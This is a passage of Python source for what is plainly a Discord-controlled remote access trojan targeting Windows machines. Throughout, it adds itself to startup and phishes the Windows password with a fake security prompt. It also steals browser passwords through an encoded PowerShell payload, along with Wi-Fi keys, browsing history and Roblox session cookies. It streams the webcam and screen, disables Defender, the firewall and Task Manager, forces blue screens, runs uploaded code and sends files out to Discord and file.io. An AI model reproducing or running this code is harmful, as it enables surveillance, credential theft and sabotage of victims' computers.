        try:
            key1 = winreg.HKEY_CURRENT_USER
            key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)

            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
            open_.Close()
            await ctx.send("Successfully added it to `run` startup")
        except PermissionError:
            shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
            await ctx.send("Permission was denied, added it to `startup folder` instead")




@slash.slash(name="WinPhishing", description="Add the program to startup", guild_ids=g)
async def WinPhishing_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            await ctx.send("[*] Command successfuly executed")
            import sys
            import subprocess
            import os
            cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd92 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
            instruction = full_cmd
            def shell():   
               output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               return output
            result = str(shell().stdout.decode('CP437'))
            await ctx.send("password user typed in is: " + result)


@slash.slash(name="voice", description="Add the program to startup", guild_ids=g)
async def voice_command(ctx: SlashContext, text: str):
    if ctx.channel.name == channel_name:
            await ctx.send("speaking")
            import win32com.client as wincl
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(text)

            await ctx.send("spoken")


@slash.slash(name="passwords", description="Take all browser saved passwords", guild_ids=g)
async def passwords_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("trying to get passwords")
        try:
             import subprocess
             import os
             temp= os.getenv('temp')
             def shell(command):
                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output.stdout.decode('CP437').strip()
             passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
             f4 = open(temp + r"\passwords.txt", 'w')
             f4.write(str(passwords))
             f4.close()
             file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
             await ctx.send("passwords", file=file)
             os.remove(temp + r"\passwords.txt")
        except:
            await ctx.send("try again or there is no passwords or there is a problem")





@slash.slash(name="streamcam", description="Add the program to startup", guild_ids=g)
async def streamcam_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            await ctx.send("streaming")
            import os
            import time
            import cv2
            import threading
            import sys
            import pathlib
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            file = temp + r"\hobo\hello.txt"
            if os.path.isfile(file):
                delelelee = "del " + file + r" /f"
                os.system(delelelee)
                os.system(r"RMDIR %temp%\hobo /s /q")
            while True:
                return_value, image = camera.read()
                cv2.imwrite(temp + r"\temp.png", image)
                boom = discord.File(temp + r"\temp.png", filename="temp.png")
                kool = await ctx.send(file=boom)
                temp = (os.getenv('TEMP'))
                file = temp + r"\hobo\hello.txt"
                if os.path.isfile(file):
                    del camera
                    break
                else:
                    continue


@slash.slash(name="stopcam", description="Add the program to startup", guild_ids=g)
async def stopcam_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            await ctx.send("stream stoped")
            import os
            os.system(r"mkdir %temp%\hobo")
            os.system(r"echo hello>%temp%\hobo\hello.txt")
            os.system(r"del %temp\temp.png /F")


@slash.slash(name="streamscreen", description="Add the program to startup", guild_ids=g)
async def streamscreen_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            await ctx.send("streaming screen")
            import os
            from mss import mss
            temp = (os.getenv('TEMP'))
            hellos = temp + r"\hobos\hellos.txt"        
            if os.path.isfile(hellos):
                os.system(r"del %temp%\hobos\hellos.txt /f")
                os.system(r"RMDIR %temp%\hobos /s /q")      
            else:
                pass
            while True:
                with mss() as sct:
                    sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
                path = (os.getenv('TEMP')) + r"\monitor.png"
                file = discord.File((path), filename="monitor.png")
                await ctx.send(file=file)
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\hobos\hellos.txt"
                if os.path.isfile(hellos):
                    break
                else:
                    continue


@slash.slash(name="screenstop", description="Add the program to startup", guild_ids=g)
async def screenstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            await ctx.send("stoped stream screen")
            os.system(r"mkdir %temp%\hobos")
            os.system(r"echo hello>%temp%\hobos\hellos.txt")
            os.system(r"del %temp%\monitor.png /F")


@slash.slash(name="shutdown", description="shutdown pc", guild_ids=g)
async def shutdown_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import os
            uncritproc()
            os.system("shutdown /p")
            await ctx.send("shutdown")

@slash.slash(name="download", description="donwload a file pc", guild_ids=g)
async def shutdown_command(ctx: SlashContext, path: str):
    if ctx.channel.name == channel_name:
            import subprocess
            import os
            filename=path
            check2 = os.stat(filename).st_size
            if check2 > 7340032:
                import requests
                await ctx.send("this may take some time becuase it is over 8 MB. please wait")
                response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                await ctx.send("download link: " + response)
                await ctx.send("[*] Command successfuly executed")
            else:
                file = discord.File(path, filename=path)
                await ctx.send("[*] Command successfuly executed", file=file)


@slash.slash(name="restart", description="restart pc", guild_ids=g)
async def restart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import os
            uncritproc()
            os.system("shutdown /r /t 00")
            await ctx.send("restarting...")
            
@slash.slash(name="logout", description="log out user", guild_ids=g)
async def logout_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import os
            uncritproc()
            os.system("shutdown /l /f")
            await ctx.send("logging off")

@slash.slash(name="critproc", description="critproc the program", guild_ids=g)
async def critproc_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                critproc()
                await ctx.send("Program critproc")
            else:
                await ctx.send(r"[*] Not admin :(")

@slash.slash(name="uncritproc", description="uncritproc the program", guild_ids=g)
async def uncritproc_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                uncritproc()
                await ctx.send("program uncritproc")
            else:
                await ctx.send(r"[*] Not admin :(")

@slash.slash(name="distaskmgr", description="disable taskmgr", guild_ids=g)
async def distaskmgr_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statuuusss
                import time
                statuuusss = None
                import subprocess
                import os
                instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statuuusss = "ok"
                    return output
                import threading
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    import winreg as reg
                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                else:
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                await ctx.send("disabled taskmgr :D")
            else:
                await ctx.send("This command requires admin privileges")


@slash.slash(name="entaskmgr", description="enable taskmgr", guild_ids=g)
async def entaskmgr_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    global statusuusss
                    import time
                    statusuusss = None
                    import subprocess
                    import os
                    instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                    def shell():
                        output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        global status
                        statusuusss = "ok"
                        return output
                    import threading
                    shel = threading.Thread(target=shell)
                    shel._running = True
                    shel.start()
                    time.sleep(1)
                    shel._running = False
                    result = str(shell().stdout.decode('CP437'))
                    if len(result) <= 5:
                        await ctx.send("enabled taskmgr")  
                    else:
                        import winreg as reg
                        reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                        await ctx.send("enabled taskmgr")
            else:
                await ctx.send("[*] This command requires admin privileges")


@slash.slash(name="wifipass", description="take wifi passwords", guild_ids=g)
async def wifipass_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                    x = x[x.find("User profiles\r\n-------------\r\n")+len("User profiles\r\n-------------\r\n"):len(x)].replace('\r\n\r\n"',"").replace('All User Profile', r'"All User Profile"')[4:]
                    lst = []
                    done = []
                    for i in x.splitlines():
                        i = i.replace('"All User Profile"     : ',"")
                        b = -1
                        while True:
                            b = b + 1
                            if i.startswith(" "):
                                i = i[1:]
                            if b >= len(i):
                                break
                        lst.append(i)
                    lst.remove('')
                    for e in lst:
                        output = subprocess.run('NETSH WLAN SHOW PROFILE "' + e + '" KEY=CLEAR ', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                        for i in output.splitlines():
                            if i.find("Key Content") != -1:
                                ok = i[4:].replace("Key Content            : ","")
                                break
                        almoast = '"' + e + '"' + ":" + '"' + ok + '"'
                        done.append(almoast)
                    await ctx.send("Taked wifi passwords:")  
                    await ctx.send(done)
            else:
                await ctx.send("This command requires admin privileges")

@slash.slash(name="history", description="take history webs", guild_ids=g)
async def history_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            await ctx.send("history")
            import sqlite3
            import os
            import time
            import shutil
            temp = (os.getenv('TEMP'))
            Username = (os.getenv('USERNAME'))
            shutil.rmtree(temp + r"\history12", ignore_errors=True)
            os.mkdir(temp + r"\history12")
            path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
            path_new = temp + r"\history12"
            copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
            os.system(copy_me_to_here)
            con = sqlite3.connect(path_new + r"\history")
            cursor = con.cursor()
            cursor.execute("SELECT url FROM urls")
            urls = cursor.fetchall()
            for x in urls:
                done = ("".join(x))
                f4 = open(temp + r"\history12" + r"\history.txt", 'a')
                f4.write(str(done))
                f4.write(str("\n"))
                f4.close()
            con.close()
            file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
            await ctx.send("history", file=file)
            def deleteme() :
                path = "rmdir " + temp + r"\history12" + " /s /q"
                os.system(path)
            deleteme()
        except Exception as e:
            await ctx.send(e)
@slash.slash(name="BlueScreen", description="blue screen pc", guild_ids=g)
async def BlueScreen_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            await ctx.send("Pc has crashed (BlueScreen)")
            import ctypes
            import ctypes.wintypes
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))


@slash.slash(name="currentDir", description="current dir ", guild_ids=g)
async def currentDir_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import subprocess as sp
            output = sp.getoutput('cd')
            await ctx.send("current dir : " + output)


@slash.slash(name="displayDir", description="dir", guild_ids=g)
async def displayDir_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import subprocess as sp
            import os
            import subprocess
            output = sp.getoutput('dir')
            if output:
                result = output
                numb = len(result)
                if numb < 1:
                    await ctx.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output22.txt"):
                        os.system(r"del %temp%\output22.txt /f")
                    f1 = open(temp + r"\output22.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output22.txt", filename="output22.txt")
                    await ctx.send("[*] Command successfuly executed", file=file)
                else:
                    await ctx.send("[*] Command successfuly executed : " + result)



@slash.slash(name="listProcess", description="list all Process", guild_ids=g)
async def listProcess_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import os
            import subprocess
            if 1==1:
                result = subprocess.getoutput("tasklist")
                numb = len(result)
                if numb < 1:
                    await ctx.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output.txt"):
                        os.system(r"del %temp%\output.txt /f")
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await ctx.send("[*] Command successfuly executed", file=file)
                else:
                    await ctx.send("[*] Command successfuly executed : " + result)





@slash.slash(name="killProcess", description="kill Process", guild_ids=g)
async def killProcess_command(ctx: SlashContext, process: str):
    if ctx.channel.name == channel_name:
            import os
            proc = process
            kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f"
            import time
            import os
            import subprocess   
            os.system(kilproc)
            import subprocess
            time.sleep(2)
            process_name = proc
            call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
            output = subprocess.check_output(call).decode()
            last_line = output.strip().split('\r\n')[-1]
            done = (last_line.lower().startswith(process_name.lower()))
            if done == False:
                await ctx.send("[*] Command successfuly executed")
            elif done == True:
                await ctx.send('[*] Command did not exucute properly')







@slash.slash(name="delete", description="delete a file", guild_ids=g)
async def delete_command(ctx: SlashContext, filepath: float):
    if ctx.channel.name == channel_name:
            global statue
            import time
            import subprocess
            import os
            instruction = filepath
            instruction = "del " + '"' + instruction + '"' + " /F"
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            result = shell
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            global statue
            statue = "ok"
            if statue:
                numb = len(result)
                if numb > 0:
                    await ctx.send("[*] an error has occurred")
                else:
                    await ctx.send("[*] Command successfuly executed")
            else:
                await ctx.send("[*] Command not recognized or no output was obtained")
                statue = None



@slash.slash(name="diasableAntivirus", description="disable the anti virus", guild_ids=g)
async def disableAntivirus_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:            
                import subprocess
                instruction = """ REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  """
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    return output
                result = str(shell().stdout.decode('CP437'))
                done = result.split()
                boom = done[2:]
                if boom <= ['17763']:
                    os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                    await ctx.send("[*] Command successfuly executed")
                elif boom >= ['18362']:
                    os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                    await ctx.send("[*] Command successfuly executed")
                else:
                    await ctx.send("[*] An unknown error has occurred")     
            else:
                await ctx.send("[*] This command requires admin privileges")

@slash.slash(name="diasableFireWall", description="disable the fire wall", guild_ids=g)
async def disableFireWall_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                os.system(r"NetSh Advfirewall set allprofiles state off")
                await ctx.send("[*] Command successfuly executed")
            else:
                await ctx.send("[*] This command requires admin privileges")








@slash.slash(name="selfDestruct", description="selfDestruct", guild_ids=g)
async def selfDestruct_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import inspect
            import os
            import sys
            import inspect
            uncritproc()
            cmd2 = inspect.getframeinfo(inspect.currentframe()).filename
            hello = os.getpid()
            bat = """@echo off""" + " & " + "taskkill" + r" /F /PID " + str(hello) + " &" + " del " + '"' + cmd2 + '"' + r" /F" + " & " + r"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b"""
            temp = (os.getenv("TEMP"))
            temp5 = temp + r"\delete.bat"
            if os.path.isfile(temp5):
                delelee = "del " + temp5 + r" /f"
                os.system(delelee)                
            f5 = open(temp + r"\delete.bat", 'a')
            f5.write(bat)
            f5.close()
            os.system(r"start /min %temp%\delete.bat")








@slash.slash(name="displayoff", description="display off", guild_ids=g)
async def displayoff_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                await ctx.send("[*] Command successfuly executed")
            else:
                await ctx.send("[!] Admin rights are required for this operation")




@slash.slash(name="displayon", description="display on", guild_ids=g)
async def displayon_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                from pynput.keyboard import Key, Controller
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                await ctx.send("[*] Command successfuly executed")
            else:
                await ctx.send("[!] Admin rights are required for this operation")
        except Exception as e:
            await ctx.send(f"```error```\n {e}")






@slash.slash(name="ejectCD", description="eject the fisic cd", guild_ids=g)
async def ejectCD_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            await ctx.send("ejecting cd")
            import ctypes
            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
            




@slash.slash(name="retractCD", description="retract the fisic cd", guild_ids=g)
async def retractCD_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            await ctx.send("RetractingCd")
            import ctypes
            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
            

@slash.slash(name="cd", description="change directory", guild_ids=g)
async def changeDir_command(ctx: SlashContext, dir: str):
    if ctx.channel.name == channel_name:
            import os
            os.chdir(dir)
            await ctx.send(f"cd to : {dir}")

@slash.slash(name="notify", description="notify their pc", guild_ids=g)
async def notify_command(ctx: SlashContext,app_name:str, message: str, title: str, icon_url:str=None):
    if ctx.channel.name == channel_name:
        import plyer.platforms
        import plyer.platforms.win
        import plyer.platforms.win.notification
        await ctx.send("sending")
        if icon_url != None:
            try:
                temp = (os.getenv("TEMP"))
                from plyer import notification
                image = requests.get(icon_url).content
                with open(temp + "/app_icon.ico", 'wb') as handler:{
                        handler.write(image)
                }     
                notification.notify(
                    app_name = app_name,
                    title = title,
                    app_icon = (temp + r"/app_icon.ico"),
                    message = message
                )
                await ctx.send("Notification send")
                os.remove(temp + "/app_icon.ico")
            except Exception as e:
                await ctx.send(f"```error```\n {e}")
        else:
            try:  
                from plyer import notification
                notification.notify(
                    app_name = app_name,
                    title = title,
                    message = message
                )
            except Exception as e:
                await ctx.send(f"```error```\n {e}")
@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)


        if message.content.startswith("!audio"):
            import os
            temp = (os.getenv("TEMP"))
            temp = temp + r"\audiofile.wav"
            if os.path.isfile(temp):
                delelelee = "del " + temp + r" /f"
                os.system(delelelee)
            temp1 = (os.getenv("TEMP"))
            temp1 = temp1 + r"\sounds.vbs"
            if os.path.isfile(temp1):
                delelee = "del " + temp1 + r" /f"
                os.system(delelee)                
            await message.attachments[0].save(temp)
            temp2 = (os.getenv("TEMP"))
            f5 = open(temp2 + r"\sounds.vbs", 'a')
            result = """ Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = """ + '"' + temp + '"' """: oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close """
            f5.write(result)
            f5.close()
            os.system(r"start %temp%\sounds.vbs")
            await message.channel.send("[*] Command successfuly executed")
        elif message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send(f"saved in ```{message.content[8:]}```")
        elif message.content.startswith("!wallpaper"):
            import ctypes
            import os
            path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            await message.channel.send("[*] Command successfuly executed")
        elif message.content.startswith("!python"):
            import sys, os
            temp = (os.getenv("TEMP") + "\win32tempfile")
            await message.attachments[0].save(temp)
            await message.channel.send(f"saved in ```{temp}```")
            from io import StringIO
            import traceback
            new_stdout = StringIO()
            old_stdout = sys.stdout
            sys.stdout = new_stdout
            new_stderr = StringIO()
            old_stderr = sys.stderr
            sys.stderr = new_stderr
            if os.path.exists(temp):
                await message.channel.send("[*] Running python file...")
                with open(temp, 'r') as f:
                    python_code = f.read()
                    try:
                        exec(python_code)
                    except Exception as exc:
                        await message.channel.send(traceback.format_exc())
            sys.stdout = old_stdout
            sys.stderr = old_stderr
            await message.channel.send(f"**output**```{new_stdout.getvalue()}{new_stderr.getvalue()}```")
            (os.remove(temp))




@slash.slash(name="winsound", description="windows sound their pc", guild_ids=g)
async def winsound_command(ctx: SlashContext, soundfilepath: str,times: int):
    if ctx.channel.name == channel_name:
        await ctx.send("Sending sounds")
        n = times
        temp= (f"{soundfilepath}")
        temp2 = (os.getenv("TEMP"))
        f5 = open(temp2 + r"\winsounds.vbs", 'w')
        result = """ Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = """ + '"' + temp + '"' """: oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close """
        f5.write(result)
        f5.close()
        while (n > 0):    
                import winsound
                try:
                    os.system(r"start %temp%\winsounds.vbs")
                except:
                    await ctx.send("There is a problem or thats not a windows file")
                time.sleep(.5)
                n-=1
        await ctx.send("All sounds send")







@slash.slash(name="robloxCookie", description="get robloxCookie", guild_ids=g)
async def robloxCookie_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import browser_cookie3

        try:
                        cookies = browser_cookie3.edge(domain_name='roblox.com')
                        cookies = str(cookies)
                        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                        await ctx.send(cookie)
        except:
                        pass

               
        try:
                        cookies = browser_cookie3.chrome(domain_name='roblox.com')
                        cookies = str(cookies)
                        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                        await ctx.send(cookie)
                        
        except:
                        pass

             
        try:
                        cookies = browser_cookie3.firefox(domain_name='roblox.com')
                        cookies = str(cookies)
                        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                        await ctx.send(cookie)
        except:
                        pass

                
        try:
                        cookies = browser_cookie3.opera(domain_name='roblox.com')
                        cookies = str(cookies)
                        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                        await ctx.send(cookie)
        except:
                        pass

            
        try:
                        cookies = browser_cookie3.brave(domain_name='roblox.com')
                        cookies = str(cookies)
                        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                        await ctx.send(cookie)
        except:
                        pass


@slash.slash(name="startNgrok", description="start port forwarding", guild_ids=g)
async def startNgrok_command(ctx: SlashContext, token: str, port: int):
    if ctx.channel.name == channel_name:
        import time
        ntoken = token
        global ngrokMode
        ngrokMode = True
        p = port
        def ngrok():
            from pyngrok import ngrok, conf
            conf.get_default().auth_token = ntoken

            # <NgrokTunnel: "http://<public_sub>.ngrok.io" -> "http://localhost:80">
            global ngrok_tunnel
            ngrok_tunnel = ngrok.connect(p)
            print(ngrok_tunnel)
            while True:
                if ngrokMode == False:
                    return

        import threading
        global tngrok
        tngrok = threading.Thread(target=ngrok)
        tngrok._running = True
        tngrok.daemon = True
        await ctx.send("starting please wait 30 secons")
        tngrok.start()
        time.sleep(30)
        await ctx.send(f"ngrok Started! link \n \n{ngrok_tunnel}")






from tkinter import *
@slash.slash(name="gotHacked", description="stop ngrok", guild_ids=g)
async def gotHacked_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            from random import randint
            import time
            import threading

            root = Tk()
            root.attributes("-alpha", 0)
            root.overrideredirect(1)
            root.attributes("-topmost", 1)

            def placewindows():
                while True:
                    win = Toplevel(root)
                    win.geometry("300x60+" + str(randint(0, root.winfo_screenwidth() - 300)) + "+" + str(randint(0, root.winfo_screenheight() - 60)))
                    win.overrideredirect(1)
                    Label(win, text="You got hacked", fg="red").place(relx=.38, rely=.3)
                    win.lift()
                    win.attributes("-topmost", True)
                    win.attributes("-topmost", False)
                    root.lift()
                    root.attributes("-topmost", True)
                    root.attributes("-topmost", False)
                    time.sleep(.05)

            threading.Thread(target=placewindows).start()

            root.mainloop()

@slash.slash(name="victims", description="send all acive pc's", guild_ids=g)
async def victims_command(message):
    await message.channel.send(f"```{os.getlogin()} | {ip} | {country} | {city} || session : {channel_name}```")


def tryLogin():
    while True:
        get_token()
        get_gild()
        try:
            get_token()
            get_gild()
            client.run(token)
            return
        except:
            if webhookMode == True:
                try:
                    webhook.send(f"{os.getlogin()} | {ip} | {country} | {city} || ```have an error when tried to connect your bot please check your token and gild here``` {weblink}/public")
                except:
                    pass
            time.sleep(10)


if __name__ == "__main__":
    tryLogin()
